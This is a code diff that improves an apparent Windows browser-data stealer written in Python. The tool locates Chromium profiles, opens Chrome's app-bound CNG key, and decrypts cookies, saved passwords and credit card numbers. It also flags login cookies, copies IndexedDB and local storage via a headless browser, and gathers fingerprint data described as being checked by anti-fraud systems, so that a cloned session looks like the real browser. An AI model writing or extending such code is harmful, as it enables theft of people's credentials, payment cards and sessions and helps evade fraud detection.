@@ -28,6 +28,7 @@ from contextlib import contextmanager
 import tempfile
 import argparse
 import collections
+from urllib.parse import urlparse
 
 import windows
 import windows.crypto
@@ -178,36 +179,53 @@ def discover_firefox_browsers():
 def enumerate_chromium_profiles(user_data):
     """Find every profile in a Chromium 'User Data' dir that has a cookie DB.
 
-    Returns [{profile, cookie_db}]. Handles both the modern 'Network\\Cookies'
-    layout and the older 'Cookies' one, plus Opera's "profile == root" layout.
+    Returns [{profile, cookie_db}]. Handles the modern 'Network\\Cookies' layout,
+    the older 'Cookies' layout, and forks that keep the profile directly in User
+    Data or nest it an extra level deep. The scan is depth-limited (two levels)
+    so it stays fast and never hard-codes a specific profile layout.
     """
     profiles = []
     seen = set()
 
-    def add(dir_path, label):
+    def consider(profile_dir, label):
         for rel in (os.path.join("Network", "Cookies"), "Cookies"):
-            db = os.path.join(dir_path, rel)
+            db = os.path.join(profile_dir, rel)
             if os.path.isfile(db):
                 key = os.path.normcase(os.path.dirname(db))
                 if key in seen:
-                    return
+                    return True
                 seen.add(key)
                 profiles.append({"profile": label, "cookie_db": db})
-                return
+                return True
+        return False
 
-    # Opera (and some forks) keep the default profile directly in User Data.
-    add(user_data, "Default")
+    # Some forks keep the default profile directly in the User Data root.
+    consider(user_data, "Default")
 
     try:
-        for entry in sorted(os.listdir(user_data)):
-            full = os.path.join(user_data, entry)
-            if not os.path.isdir(full):
-                continue
-            if entry in ("System Profile",):   # no user cookies of interest
-                continue
-            add(full, entry)
+        top_entries = sorted(os.listdir(user_data))
     except OSError:
-        pass
+        return profiles
+
+    for entry in top_entries:
+        full = os.path.join(user_data, entry)
+        if not os.path.isdir(full):
+            continue
+        if entry == "System Profile":   # no user cookies of interest
+            continue
+        if consider(full, entry):
+            continue
+        # One extra level for forks that nest the profile inside another folder.
+        try:
+            sub_entries = sorted(os.listdir(full))
+        except OSError:
+            continue
+        for sub in sub_entries:
+            if sub == "System Profile":
+                continue
+            sub_full = os.path.join(full, sub)
+            if os.path.isdir(sub_full):
+                consider(sub_full, entry)
 
     return profiles
 
@@ -271,7 +289,7 @@ def parse_key_blob(blob_data: bytes) -> dict:
 
     return parsed_data
 
-def decrypt_with_cng(input_data):
+def decrypt_with_cng(input_data, key_names=("Google Chromekey1",)):
     ncrypt = ctypes.windll.NCRYPT
     hProvider = gdef.NCRYPT_PROV_HANDLE()
     provider_name = "Microsoft Software Key Storage Provider"
@@ -279,9 +297,19 @@ def decrypt_with_cng(input_data):
     assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"
 
     hKey = gdef.NCRYPT_KEY_HANDLE()
-    key_name = "Google Chromekey1"
-    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
-    assert status == 0, f"NCryptOpenKey failed with status {status}"
+    opened = False
+    last_error = None
+    # The app-bound key name differs per Chromium vendor, so try each candidate
+    # instead of assuming a single hard-coded name. Chrome's is "Google Chromekey1".
+    for key_name in key_names:
+        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
+        if status == 0:
+            opened = True
+            break
+        last_error = status
+    if not opened:
+        ncrypt.NCryptFreeObject(hProvider)
+        raise OSError(f"NCryptOpenKey failed for {key_names}: status {last_error}")
 
     pcbResult = gdef.DWORD(0)
     input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
@@ -452,25 +480,33 @@ def strip_domain_hash(plaintext: bytes, host_key: str, version: str) -> bytes:
     return plaintext
 
 
-def _aesgcm_cookie(encrypted_value: bytes, key: bytes, host: str, version: str) -> str:
-    """Decrypt a v10/v20 cookie: [prefix(3) | iv(12) | ciphertext | tag(16)]."""
+def _aesgcm_cookie(encrypted_value: bytes, key: bytes, host: str, version: str, strip_hash: bool = True) -> str:
+    """Decrypt a v10/v20 value: [prefix(3) | iv(12) | ciphertext | tag(16)].
+
+    Only cookies prepend a SHA-256(domain) prefix to the plaintext; passwords and
+    credit cards do not. Pass strip_hash=False for those.
+    """
     try:
         iv = encrypted_value[3:15]
         ciphertext = encrypted_value[15:-16]
         tag = encrypted_value[-16:]
         plaintext = AESGCM(key).decrypt(iv, ciphertext + tag, None)
-        plaintext = strip_domain_hash(plaintext, host, version)
+        if strip_hash:
+            plaintext = strip_domain_hash(plaintext, host, version)
         return plaintext.decode("utf-8", "replace")
     except Exception as e:
         return f"<decrypt failed: {e}>"
 
 
-def decrypt_chromium_value(encrypted_value: bytes, host: str, v10_key, v20_key):
-    """Decrypt one Chromium cookie value.
+def decrypt_chromium_value(encrypted_value: bytes, host: str, v10_key, v20_key, domain_bound: bool = True):
+    """Decrypt one Chromium value.
 
-    Returns (value, version). value is None only when we recognise the cookie
+    Returns (value, version). value is None only when we recognise the value
     type but lack the key for it (so the caller can count it as 'skipped').
     version is one of: v20, v10, dpapi, empty.
+
+    domain_bound is True for cookies (which carry the SHA-256(domain) prefix) and
+    False for passwords / credit cards (which do not).
     """
     if not encrypted_value:
         return "", "empty"
@@ -479,11 +515,11 @@ def decrypt_chromium_value(encrypted_value: bytes, host: str, v10_key, v20_key):
     if prefix == b"v20":
         if v20_key is None:
             return None, "v20"
-        return _aesgcm_cookie(encrypted_value, v20_key, host, "v20"), "v20"
+        return _aesgcm_cookie(encrypted_value, v20_key, host, "v20", strip_hash=domain_bound), "v20"
     if prefix == b"v10":
         if v10_key is None:
             return None, "v10"
-        return _aesgcm_cookie(encrypted_value, v10_key, host, "v10"), "v10"
+        return _aesgcm_cookie(encrypted_value, v10_key, host, "v10", strip_hash=domain_bound), "v10"
 
     # Legacy: the whole value is a raw DPAPI blob (pre-v10 Chromium).
     try:
@@ -536,13 +572,41 @@ def is_login_cookie(name: str) -> bool:
         return False
     return any(k in n for k in LOGIN_COOKIE_KEYWORDS)
 
+# Common second-level ccTLDs that the naive last-two-labels heuristic gets wrong
+# (e.g. "a.example.co.uk" would otherwise collapse to "co.uk"). Kept intentionally
+# small; full resolution would require the Public Suffix List.
+_MULTI_PART_TLDS = {
+    "co.uk", "org.uk", "ac.uk", "gov.uk", "me.uk", "net.uk", "ltd.uk", "plc.uk",
+    "com.ng", "org.ng", "net.ng", "edu.ng", "gov.ng",
+    "com.au", "net.au", "org.au", "edu.au", "gov.au",
+    "co.za", "org.za", "net.za", "gov.za",
+    "co.nz", "net.nz", "org.nz", "gov.nz",
+    "com.br", "net.br", "org.br", "gov.br",
+    "co.jp", "ne.jp", "or.jp", "ac.jp", "go.jp",
+    "co.in", "net.in", "org.in", "gov.in", "ac.in",
+    "com.mx", "org.mx", "gob.mx",
+    "com.ar", "org.ar", "gov.ar",
+    "com.tr", "org.tr", "net.tr",
+    "com.sg", "org.sg", "net.sg", "edu.sg",
+    "com.hk", "org.hk", "net.hk", "edu.hk", "gov.hk",
+    "co.kr", "or.kr", "ne.kr", "go.kr", "ac.kr",
+    "com.my", "org.my", "net.my", "edu.my",
+    "com.eg", "org.eg", "net.eg", "edu.eg", "gov.eg",
+    "com.ph", "org.ph", "net.ph", "edu.ph", "gov.ph",
+    "com.pk", "org.pk", "net.pk", "edu.pk", "gov.pk",
+}
+
+
 def registrable_domain(host_key: str) -> str:
-    """Collapse a cookie host to its site so a site's cookies group together,
-    e.g. '.www.youtube.com' -> 'youtube.com'. Simple last-two-labels heuristic."""
+    """Collapse a cookie host to its registrable site so a site's cookies group
+    together, e.g. '.www.youtube.com' -> 'youtube.com', 'a.b.example.co.uk' ->
+    'example.co.uk'."""
     host = (host_key or "").lstrip(".")
     labels = host.split(".")
     if len(labels) <= 2:
         return host
+    if len(labels) >= 3 and ".".join(labels[-2:]).lower() in _MULTI_PART_TLDS:
+        return ".".join(labels[-3:])
     return ".".join(labels[-2:])
 
 
@@ -729,8 +793,8 @@ def process_chromium_browser(browser, emit):
                 "secure": bool(secure),
                 "httponly": bool(httponly),
                 "samesite": samesite,         # -1=unspecified, 0=None, 1=Lax, 2=Strict
-                "priority": priority or 1,
-                "source_scheme": source_scheme or 0,
+                "priority": priority if priority is not None else 1,
+                "source_scheme": source_scheme if source_scheme is not None else 0,
                 "is_login": is_login_cookie(cname),
                 "version": version,
             })
@@ -801,7 +865,7 @@ def read_chromium_passwords(profile_path, v10_key, v20_key, emit):
     for url, username, enc_pw in rows:
         if not enc_pw:
             continue
-        value, version = decrypt_chromium_value(enc_pw, url or "", v10_key, v20_key)
+        value, version = decrypt_chromium_value(enc_pw, url or "", v10_key, v20_key, domain_bound=False)
         if value is None:            # recognised but no key for it
             skipped += 1
             continue
@@ -854,7 +918,7 @@ def read_chromium_credit_cards(profile_path, v10_key, v20_key, emit):
     for name, exp_m, exp_y, enc_num in rows:
         if not enc_num:
             continue
-        number, version = decrypt_chromium_value(enc_num, "", v10_key, v20_key)
+        number, version = decrypt_chromium_value(enc_num, "", v10_key, v20_key, domain_bound=False)
         if number is None:
             skipped += 1
             continue
@@ -1483,155 +1547,174 @@ def collect_browser_fingerprint(user_data_path, browser_name):
 def _extract_preferences(user_data_path):
     """Extract relevant signals from Chromium's Preferences JSON.
 
-    The Preferences file (in the User Data root, NOT per-profile) holds the
-    browser's accept_languages — the EXACT string sent in every HTTP Accept-
+    Preferences is a *per-profile* file (e.g. ``Default/Preferences``), not a
+    User Data root file. We scan the Default profile first, then any other
+    profile, so this keeps working regardless of which profile is active and
+    without hard-coding a specific profile name.
+
+    The accept_languages field is the EXACT string sent in every HTTP Accept-
     Language header. This string often differs from the OS locale (e.g.
     "en-NG,en-US;q=0.9,en;q=0.8" vs. just "en-NG") and is part of the
     fingerprint that anti-fraud systems check.
-
-    Also extracts per-site permissions (camera, mic, location, notifications)
-    so the cloned session mirrors the real browser's trust state.
     """
-    prefs_path = os.path.join(user_data_path, "Preferences")
-    if not os.path.isfile(prefs_path):
-        return {}
+    candidates = []
+    default = os.path.join(user_data_path, "Default", "Preferences")
+    candidates.append(default)
     try:
-        with open(prefs_path, "r", encoding="utf-8") as f:
-            prefs = json.load(f)
-    except Exception:
-        return {}
+        for entry in sorted(os.listdir(user_data_path)):
+            full = os.path.join(user_data_path, entry)
+            if os.path.isdir(full) and entry != "System Profile":
+                candidates.append(os.path.join(full, "Preferences"))
+    except OSError:
+        pass
 
-    result = {}
+    for prefs_path in candidates:
+        if not os.path.isfile(prefs_path):
+            continue
+        try:
+            with open(prefs_path, "r", encoding="utf-8") as f:
+                prefs = json.load(f)
+        except Exception:
+            continue
+        al = (prefs.get("intl") or {}).get("accept_languages", "")
+        if al:
+            return {"accept_languages": al}
 
-    # accept_languages — the literal header string
-    al = (prefs.get("intl") or {}).get("accept_languages", "")
-    if al:
-        result["accept_languages"] = al
-
-    return result
+    return {}
 
 
 # ---------------------------------------------------------------------------
 # IndexedDB extraction via Playwright (offline LevelDB parsing is unreliable)
 # ---------------------------------------------------------------------------
 
-def _indexeddb_dirs(user_data):
-    """Return a set of profile dir names that have IndexedDB data under *user_data*.
-    Fast directory scan — no file opens, no LevelDB parsing."""
+def _indexeddb_hosts(profile_dir):
+    """Return host names that appear in a profile's IndexedDB directory.
+
+    Chromium names each database folder like ``https_www.example.com_0.leveldb``
+    or ``http_localhost_8080.leveldb``. We only need the host part here so we can
+    filter which cookie/localStorage origins are worth visiting (avoiding a slow
+    browser launch + navigation for origins that have no IndexedDB at all).
+    """
+    hosts = set()
+    idx_path = os.path.join(profile_dir, "IndexedDB")
+    if not os.path.isdir(idx_path):
+        return hosts
     try:
-        entries = os.listdir(user_data)
+        entries = os.listdir(idx_path)
     except OSError:
-        return set()
-    profiles_with_idx = set()
-    for entry in entries:
-        idx_path = os.path.join(user_data, entry, "IndexedDB")
-        if os.path.isdir(idx_path):
-            try:
-                # A non-empty IndexedDB folder means the profile has storage
-                contents = os.listdir(idx_path)
-                if any(c.endswith(".leveldb") for c in contents):
-                    profiles_with_idx.add(entry)
-            except OSError:
-                continue
-    return profiles_with_idx
+        return hosts
+    for name in entries:
+        if not name.endswith(".leveldb"):
+            continue
+        base = name[: -len(".leveldb")]
+        # Strip the scheme prefix.
+        for prefix in ("https_", "http_", "chrome-extension_"):
+            if base.startswith(prefix):
+                base = base[len(prefix):]
+                break
+        # Strip a trailing "_<digits>" (port / partition index), then any "_".
+        while base and base[-1:].isdigit():
+            base = base[:-1]
+        base = base.rstrip("_")
+        if base:
+            hosts.add(base)
+    return hosts
 
 
-def extract_indexeddb_via_playwright(user_data, browser_name, emit):
-    """Launch Chromium pointing at an existing profile and extract IndexedDB
-    via storageState(indexedDB=True). Returns {origin: [db_dicts]} or None.
+def extract_indexeddb_via_playwright(profile_dir, browser_name, origins, emit):
+    """Extract IndexedDB for ONE profile by launching Chromium against a temp copy.
 
-    Optimised for speed:
-    - Uses data:text/html, (loads instantly — no network)
-    - Skips serialising cookies + localStorage (we already have those offline)
-    - Adds --disable-gpu and other flags to bypass unnecessary work
+    Returns {origin: [db_descriptors]} or None.
+
+    We copy the profile's IndexedDB/Local Storage into a throwaway user-data dir
+    because:
+      * Chrome/Edge refuse remote debugging (which Playwright requires) when the
+        user-data dir is their real default profile directory.
+      * It avoids locking the live profile while the browser is running.
+
+    Playwright's storage_state(indexedDB=True) only enumerates origins that have
+    been visited, so we navigate to each candidate origin (blocked to localhost
+    via request interception) before collecting.
     """
     if not HAS_PLAYWRIGHT:
         emit("    Playwright not installed; skipping IndexedDB. (pip install playwright)")
         return None
+    if not origins:
+        return None
 
     channel = _PLAYWRIGHT_CHANNEL.get(browser_name)
     label = channel or "bundled"
-    emit(f"    Extracting IndexedDB via {label} ...")
 
-    # Spinner — Chromium launch takes 30-90s with no output, so a rotating
-    # animation on stderr lets the user know the PC isn't frozen.
-    import threading
-    done = threading.Event()
-    _spinner_chars = ["|", "/", "-", "\\"]
+    indexeddb = {}
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp_user_data = os.path.join(tmp, "User Data")
+        tmp_profile = os.path.join(tmp_user_data, "Default")
+        os.makedirs(tmp_profile, exist_ok=True)
 
-    def _spinner():
-        i = 0
-        while not done.is_set():
-            sys.stderr.write(f"\r      ... {_spinner_chars[i % 4]} ")
-            sys.stderr.flush()
-            i += 1
-            done.wait(0.3)
-        sys.stderr.write("\r" + " " * 20 + "\r")
-        sys.stderr.flush()
+        copied = 0
+        for sub in ("IndexedDB", "Local Storage"):
+            src = os.path.join(profile_dir, sub)
+            if os.path.isdir(src):
+                try:
+                    shutil.copytree(src, os.path.join(tmp_profile, sub), dirs_exist_ok=True)
+                    copied += 1
+                except OSError:
+                    pass
+        if not copied:
+            return None
 
-    t = threading.Thread(target=_spinner, daemon=True)
-    t.start()
+        _FAST_FLAGS = [
+            "--disable-blink-features=AutomationControlled",
+            "--no-first-run",
+            "--no-default-browser-check",
+            "--disable-extensions",
+            "--disable-gpu",
+            "--disable-sync",
+            "--disable-background-networking",
+            "--disable-component-update",
+            "--disable-features=TranslateUI,BlinkRuntimeCallStats,OptimizationHints",
+            "--disable-ipc-flooding-protection",
+            "--disable-breakpad",
+            "--disable-dev-shm-usage",
+            "--mute-audio",
+            "--disable-notifications",
+        ]
 
-    # Chrome/Edge flags that skip unnecessary startup work in headless mode.
-    _FAST_FLAGS = [
-        "--disable-blink-features=AutomationControlled",
-        "--no-first-run",
-        "--no-default-browser-check",
-        "--disable-extensions",
-        "--disable-gpu",
-        "--disable-sync",
-        "--disable-background-networking",
-        "--disable-component-update",
-        "--disable-features=TranslateUI,BlinkRuntimeCallStats,OptimizationHints",
-        "--disable-ipc-flooding-protection",
-        "--disable-breakpad",          # no crash dumps
-        "--disable-dev-shm-usage",
-        "--mute-audio",
-        "--disable-notifications",
-    ]
+        try:
+            with sync_playwright() as p:
+                launch_kwargs = {
+                    "user_data_dir": tmp_user_data,
+                    "headless": True,
+                    "args": _FAST_FLAGS,
+                }
+                if channel:
+                    launch_kwargs["channel"] = channel
 
-    try:
-        with sync_playwright() as p:
-            launch_kwargs = {
-                "user_data_dir": user_data,
-                "headless": True,
-                "args": _FAST_FLAGS,
-            }
-            if channel:
-                launch_kwargs["channel"] = channel
+                context = p.chromium.launch_persistent_context(**launch_kwargs)
+                page = context.new_page()
+                # Never hit the network — just load enough for Chromium to expose
+                # each origin's IndexedDB databases.
+                page.route("**/*", lambda route: route.fulfill(
+                    body="<html></html>", content_type="text/html"))
+                for origin in sorted(origins):
+                    try:
+                        page.goto(origin, wait_until="domcontentloaded", timeout=15000)
+                    except Exception:
+                        continue
 
-            context = p.chromium.launch_persistent_context(**launch_kwargs)
+                state = context.storage_state(indexedDB=True)
+                context.close()
 
-            # data:text/html loads instantly — no DNS, no HTTP, no render
-            page = context.new_page()
-            page.goto("data:text/html,", wait_until="commit", timeout=5000)
+                for origin_entry in (state.get("origins") or []):
+                    origin = origin_entry.get("origin", "")
+                    dbs = origin_entry.get("indexedDB") or []
+                    if origin and dbs:
+                        indexeddb[origin] = dbs
+        except Exception as e:
+            emit(f"    ! IndexedDB extraction failed ({label}): {e}")
+            return None
 
-            # Only capture IndexedDB — cookies and localStorage are already
-            # extracted offline (faster).  This avoids reserialising data we
-            # already have.
-            state = context.storage_state(indexedDB=True)
-            context.close()
-
-            # Stop spinner
-            done.set()
-            t.join(timeout=1)
-
-            # Extract IndexedDB: per-origin database descriptors
-            indexeddb = {}
-            for origin_entry in (state.get("origins") or []):
-                origin = origin_entry.get("origin", "")
-                dbs = origin_entry.get("indexedDB") or []
-                if origin and dbs:
-                    indexeddb[origin] = dbs
-
-            emit(f"    IndexedDB captured: {len(indexeddb)} origin(s) with data")
-            return indexeddb if indexeddb else None
-
-    except Exception as e:
-        done.set()
-        t.join(timeout=1)
-        emit(f"    ! IndexedDB extraction failed: {e}")
-        return None
+    return indexeddb if indexeddb else None
 
 
 # ---------------------------------------------------------------------------
@@ -1881,59 +1964,74 @@ def main(args):
     emit("")
     emit("Extracting IndexedDB via Playwright ...")
 
-    # Pre-scan: only launch Playwright for browsers that actually have IndexedDB
-    # data on disk.  This skips the 2-3 min browser launch for "empty" profiles.
-    browsers_with_idx = []
-    for b in chromium:
-        user_data = b["user_data"]
-        browser_name = b["name"]
-        profiles_with_idx = _indexeddb_dirs(user_data)
-        if profiles_with_idx:
-            emit(f"  {browser_name}: IndexedDB found in {', '.join(profiles_with_idx)}")
-            browsers_with_idx.append(b)
-        else:
-            emit(f"  {browser_name}: no IndexedDB data — skipping Playwright launch")
+    # Build the set of origins each profile might have IndexedDB for. We source
+    # these from cookies + localStorage (already extracted offline) so we only
+    # visit origins that actually exist on this PC, and so we never hard-code
+    # origin or browser-specific paths.
+    def _origin_host(origin):
+        return urlparse(origin).hostname or ""
+
+    profile_origins = collections.defaultdict(set)
+    for r in records:
+        host = (r.get("host") or "").lstrip(".")
+        if not host:
+            continue
+        scheme = "http" if r.get("source_scheme") == 1 else "https"
+        profile_origins[(r["browser"], r["profile"])].add(f"{scheme}://{host}")
+    for (browser, profile), origins in storage_data.items():
+        profile_origins[(browser, profile)].update(origins.keys())
 
     indexeddb_data = {}   # { (browser, profile): {origin: [db_descriptors]} }
+    tasks = []            # (browser_name, profile, profile_dir, origins)
 
-    if browsers_with_idx:
-        if len(browsers_with_idx) > 1 and HAS_PLAYWRIGHT:
-            # Chrome + Edge in parallel — cuts ~4 min down to ~2 min.
+    for b in chromium:
+        browser_name = b["name"]
+        for prof in enumerate_chromium_profiles(b["user_data"]):
+            profile_dir = os.path.dirname(prof["cookie_db"])
+            if not os.path.isdir(os.path.join(profile_dir, "IndexedDB")):
+                continue
+            hosts = _indexeddb_hosts(profile_dir)
+            if not hosts:
+                continue
+            key = (browser_name, prof["profile"])
+            origins = {
+                o for o in profile_origins.get(key, ())
+                if _origin_host(o) in hosts
+            }
+            if not origins:
+                continue
+            tasks.append((browser_name, prof["profile"], profile_dir, origins))
+
+    if not tasks:
+        emit("  No IndexedDB data found on this PC — skipping")
+    else:
+        emit(f"  Found IndexedDB in {len(tasks)} profile(s)")
+        if len(tasks) > 1 and HAS_PLAYWRIGHT:
             from concurrent.futures import ThreadPoolExecutor, as_completed
-            emit(f"  Launching {len(browsers_with_idx)} browsers in parallel...")
-            futures = {}
-            with ThreadPoolExecutor(max_workers=len(browsers_with_idx)) as pool:
-                for b in browsers_with_idx:
-                    fut = pool.submit(
+            with ThreadPoolExecutor(max_workers=min(3, len(tasks))) as pool:
+                futures = {
+                    pool.submit(
                         extract_indexeddb_via_playwright,
-                        b["user_data"], b["name"], emit
-                    )
-                    futures[fut] = b
+                        profile_dir, browser_name, origins, emit,
+                    ): (browser_name, profile)
+                    for (browser_name, profile, profile_dir, origins) in tasks
+                }
                 for fut in as_completed(futures):
-                    b = futures[fut]
+                    browser_name, profile = futures[fut]
                     try:
                         result = fut.result()
                     except Exception as e:
-                        emit(f"  ! {b['name']}: {e}")
+                        emit(f"  ! {browser_name} / {profile}: {e}")
                         result = None
                     if result:
-                        profiles = enumerate_chromium_profiles(b["user_data"])
-                        for prof in profiles:
-                            key = (b["name"], prof["profile"])
-                            indexeddb_data[key] = result
-                        emit(f"  {b['name']}: attached to {len(profiles)} profile(s)")
+                        indexeddb_data[(browser_name, profile)] = result
+                        emit(f"  {browser_name} / {profile}: {len(result)} origin(s) with IndexedDB")
         else:
-            # Single browser — simple loop is fine (avoids ThreadPool overhead)
-            for b in browsers_with_idx:
-                result = extract_indexeddb_via_playwright(b["user_data"], b["name"], emit)
+            for (browser_name, profile, profile_dir, origins) in tasks:
+                result = extract_indexeddb_via_playwright(profile_dir, browser_name, origins, emit)
                 if result:
-                    profiles = enumerate_chromium_profiles(b["user_data"])
-                    for prof in profiles:
-                        key = (b["name"], prof["profile"])
-                        indexeddb_data[key] = result
-                    emit(f"  {b['name']}: attached to {len(profiles)} profile(s)")
-    else:
-        emit("  No IndexedDB data found on this PC — skipping")
+                    indexeddb_data[(browser_name, profile)] = result
+                    emit(f"  {browser_name} / {profile}: {len(result)} origin(s) with IndexedDB")
 
     # --- Collect fingerprint data ---
     emit("")
